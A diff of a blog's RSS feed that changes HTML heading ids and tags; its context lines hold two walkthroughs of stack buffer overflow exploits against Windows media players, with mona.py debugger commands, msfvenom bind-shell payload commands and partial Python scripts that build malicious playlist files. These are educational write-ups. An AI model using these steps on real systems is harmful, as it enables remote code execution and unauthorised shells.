@@ -17,7 +17,7 @@
       <guid>http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</guid>
       <description>
 
-&lt;h1 id=&#34;prequisites:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Prequisites&lt;/h1&gt;
+&lt;h1 id=&#34;prequisites&#34;&gt;Prequisites&lt;/h1&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Windows XP SP3 (en-us)&lt;/li&gt;
@@ -25,7 +25,7 @@
 &lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/wp-content/themes/exploit/applications/55740fe6c4e56674125a1968a139ed36-AviosoftDTVPlayerPro.exe&#34;&gt;AviosoftDTVPlayerPro&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h1 id=&#34;triggering-the-overflow:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Triggering the overflow&lt;/h1&gt;
+&lt;h1 id=&#34;triggering-the-overflow&#34;&gt;Triggering the overflow&lt;/h1&gt;
 
 &lt;p&gt;After some fuzzing the basic exploit can be create with the following python code.&lt;/p&gt;
 
@@ -53,7 +53,7 @@
 
 &lt;p&gt;Great, the EIP is under our control.&lt;/p&gt;
 
-&lt;h1 id=&#34;identifying-eip-offset:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Identifying EIP Offset&lt;/h1&gt;
+&lt;h1 id=&#34;identifying-eip-offset&#34;&gt;Identifying EIP Offset&lt;/h1&gt;
 
 &lt;p&gt;In order to identify the correct offset of the overflow let&amp;rsquo;s create a pattern and start again.&lt;/p&gt;
 
@@ -103,7 +103,7 @@ The output is depicted in the following screenshot.&lt;/p&gt;
 &lt;p&gt;Now we know, that we can overwrite the EIP after 260 bytes.
 After updating the initial script, we can now exactly overwrite EIP.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure &gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/overwrite_eip.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Overwriting EIP with BBBB&#34; &gt;
@@ -111,20 +111,20 @@ After updating the initial script, we can now exactly overwrite EIP.&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
 
-&lt;h1 id=&#34;controlling-eip:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Controlling EIP&lt;/h1&gt;
+
+&lt;h1 id=&#34;controlling-eip&#34;&gt;Controlling EIP&lt;/h1&gt;
 
 &lt;p&gt;Luckily, ESP points to the bytes after the BBBB.
 So let&amp;rsquo;s identify a location that stores a suiteable JMP ESP.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona jmp -r esp&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona jmp -r esp&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;Mona.py can list all suitable JMP instructions.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure &gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;JMP ESP instructions available in process memory.&#34; &gt;
@@ -132,22 +132,22 @@ So let&amp;rsquo;s identify a location that stores a suiteable JMP ESP.&lt;/p&gt
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;Let&amp;rsquo;s choose one after identifying the bad characters.&lt;/p&gt;
 
-&lt;h1 id=&#34;identifying-bad-characters:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Identifying Bad Characters&lt;/h1&gt;
+&lt;h1 id=&#34;identifying-bad-characters&#34;&gt;Identifying Bad Characters&lt;/h1&gt;
 
 &lt;p&gt;Next, we need to verify the valid charset for the exploit.
 Let&amp;rsquo;s create a byte pattern and compare it against loaded data.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona bytearray -b &amp;#39;\x00&amp;#39;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona bytearray -b &amp;#39;\x00&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;The bad characters \x0A was identified at 0x0012f489.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure &gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
@@ -155,29 +155,29 @@ Let&amp;rsquo;s create a byte pattern and compare it against loaded data.&lt;/p&
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;Iterating the previous steps until finally, all bad characters have been identified.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona compare -f c:\logs\DVDXPlayer\bytearray.bin&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona compare -f c:\logs\DVDXPlayer\bytearray.bin&lt;/span&gt;
 &lt;span class=&#34;go&#34;&gt;[+] Comparing with memory at location : 0x0012f480 (Stack)&lt;/span&gt;
 &lt;span class=&#34;go&#34;&gt;!!! Hooray, normal shellcode unmodified !!!&lt;/span&gt;
 &lt;span class=&#34;go&#34;&gt;Bytes omitted from input: 00 0a 1a&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;h1 id=&#34;adding-shellcode:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Adding Shellcode&lt;/h1&gt;
+
+&lt;h1 id=&#34;adding-shellcode&#34;&gt;Adding Shellcode&lt;/h1&gt;
 
 &lt;p&gt;Finally, let&amp;rsquo;s add a custom payload to the exploit code.
 With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x1a&amp;#39;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x1a&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;h1 id=&#34;the-exploit:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;The Exploit&lt;/h1&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt; 1 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
+&lt;h1 id=&#34;the-exploit&#34;&gt;The Exploit&lt;/h1&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt; 1 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt; 2 &lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt; 3 &lt;/span&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt; 4 &lt;/span&gt;
@@ -219,7 +219,7 @@ With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
 &lt;span class=&#34;lineno&#34;&gt;40 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt;41 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;By loading the plf file, the payload is executed.&lt;/p&gt;
 
@@ -233,7 +233,7 @@ With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
 
 &lt;/p&gt;
 
-&lt;h1 id=&#34;links-and-references:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Links and References&lt;/h1&gt;
+&lt;h1 id=&#34;links-and-references&#34;&gt;Links and References&lt;/h1&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/18109/&#34;&gt;EDB-ID: 18109&lt;/a&gt;&lt;/li&gt;
@@ -251,7 +251,7 @@ With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
       <guid>http://camelinc.info/blog/2014/05/Easy-RM-to-MP3-Converter/</guid>
       <description>
 
-&lt;h1 id=&#34;prequisites:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Prequisites&lt;/h1&gt;
+&lt;h1 id=&#34;prequisites&#34;&gt;Prequisites&lt;/h1&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Windows XP SP3 (en-us)&lt;/li&gt;
@@ -259,7 +259,7 @@ With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/wp-content/themes/exploit/applications/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe&#34;&gt;Easy RM to MP3 Converter&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h1 id=&#34;identifying-the-vulnerability:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Identifying the Vulnerability&lt;/h1&gt;
+&lt;h1 id=&#34;identifying-the-vulnerability&#34;&gt;Identifying the Vulnerability&lt;/h1&gt;
 
 &lt;p&gt;First of all we need to identify the appropriate buffer size for the exploit.
 To do this, we  simply execute the following python script.&lt;/p&gt;
@@ -273,7 +273,7 @@ To do this, we  simply execute the following python script.&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h1 id=&#34;identifying-eip-offset:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Identifying EIP Offset&lt;/h1&gt;
+&lt;h1 id=&#34;identifying-eip-offset&#34;&gt;Identifying EIP Offset&lt;/h1&gt;
 
 &lt;p&gt;Subsequently, open up the resulting playlist in the converter.
 Boom, the application crashes.&lt;/p&gt;
@@ -329,7 +329,7 @@ The application crashes and we now have a unique pattern stored in EIP.&lt;/p&gt
 Subsequently, this allows an update of the exploit script in order to reflect the newly acquired knowledge.
 This gives us power over EIP.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure &gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Verifying the offset by overwriting EIP with BBBB.&#34; &gt;
@@ -337,18 +337,18 @@ This gives us power over EIP.&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
 
-&lt;h1 id=&#34;controlling-eip:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Controlling EIP&lt;/h1&gt;
+
+&lt;h1 id=&#34;controlling-eip&#34;&gt;Controlling EIP&lt;/h1&gt;
 
 &lt;p&gt;The next step is to jump to a shellcode.
 Mona helps finding an appropriate address in memory.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona jmp -r esp&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona jmp -r esp&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;p&gt;
+
+
 
 &lt;figure &gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Moan.py lists the possible JMP ESP instructions.&#34; &gt;
@@ -356,25 +356,25 @@ Mona helps finding an appropriate address in memory.&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;For this exploit the instruction at 0x77c72eee was chosen.
 This allows us to jump to ESP.&lt;/p&gt;
 
-&lt;h1 id=&#34;identifying-bad-characters:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Identifying Bad Characters&lt;/h1&gt;
+&lt;h1 id=&#34;identifying-bad-characters&#34;&gt;Identifying Bad Characters&lt;/h1&gt;
 
 &lt;p&gt;As ESP points to 0x000FF730 (EIP+4) we can place our shellcode at the specific location.
 Before generating a payload, we also have to check for &lt;strong&gt;bad characters&lt;/strong&gt;.
 Mona also provides help and can create an array with excluded characters.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona bytearray -b &amp;#39;\x00\x0A&amp;#39;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona bytearray -b &amp;#39;\x00\x0A&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;The array has to be included in the buffer.
 Subsequently, bad characters can be identified in a debugger.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure &gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The byte array in memory is used to identify bad characters.&#34; &gt;
@@ -382,30 +382,30 @@ Subsequently, bad characters can be identified in a debugger.&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;Mona also provides a command to help with this step of exploit development.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona compare -f bytearray.bin&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona compare -f bytearray.bin&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;h1 id=&#34;adding-shellcode:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Adding Shellcode&lt;/h1&gt;
+
+&lt;h1 id=&#34;adding-shellcode&#34;&gt;Adding Shellcode&lt;/h1&gt;
 
 &lt;p&gt;After iterating the above process in order to identify all bad characters a payload can be create.
 Metasploit provides numerous payloads to choose from.
 Most importantly, the payload has to be encoded as to eliminate any bad characters.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x0d&amp;#39;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x0d&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;h1 id=&#34;the-exploit:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;The Exploit&lt;/h1&gt;
+
+&lt;h1 id=&#34;the-exploit&#34;&gt;The Exploit&lt;/h1&gt;
 
 &lt;p&gt;Following this, the payload has to be added to the exploit script.
 The final step is to create the malicious m3u file and manually load it into the software.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt; 1 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt; 1 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt; 2 &lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt; 3 &lt;/span&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt; 4 &lt;/span&gt;
@@ -451,7 +451,7 @@ The final step is to create the malicious m3u file and manually load it into the
 &lt;span class=&#34;lineno&#34;&gt;44 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;lineno&#34;&gt;45 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;By loading the m3u file, the payload is executed.&lt;/p&gt;
 
@@ -465,7 +465,7 @@ The final step is to create the malicious m3u file and manually load it into the
 
 &lt;/p&gt;
 
-&lt;h1 id=&#34;links-and-references:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Links and References&lt;/h1&gt;
+&lt;h1 id=&#34;links-and-references&#34;&gt;Links and References&lt;/h1&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/9186/&#34;&gt;EDB-ID: 9186&lt;/a&gt;&lt;/li&gt;
